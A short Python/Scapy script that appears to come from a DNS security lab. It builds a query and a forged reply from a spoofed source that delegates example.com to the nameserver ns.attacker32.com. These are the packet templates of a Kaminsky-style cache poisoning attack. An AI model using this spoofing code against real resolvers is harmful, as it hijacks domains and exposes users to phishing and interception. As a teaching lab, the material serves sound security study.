#!/usr/bin/env python3
from scapy.all import *

name   = 'twysw.example.com'
domain = 'example.com'
ns     = 'ns.attacker32.com'

# 1. Construct the DNS request
Qdsec  = DNSQR(qname=name)
dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0,
          arcount=0, qd=Qdsec)

ip = IP(dst='10.9.0.53', src='10.9.0.5')
udp = UDP(dport=53, sport=33333, chksum=0)
pkt = ip/udp/dns

with open('ip_req.bin', 'wb') as f:
    f.write(bytes(pkt))


# 2. Construct the DNS reply
Qdsec  = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=0, qr=1,
          qdcount=1, ancount=1, nscount=1, arcount=0,
          qd=Qdsec, an=Anssec, ns=NSsec)

ip = IP(dst='10.9.0.53', src='199.43.135.53')
udp = UDP(dport=33333, sport=53, chksum=0)
pkt = ip/udp/dns

with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(pkt))

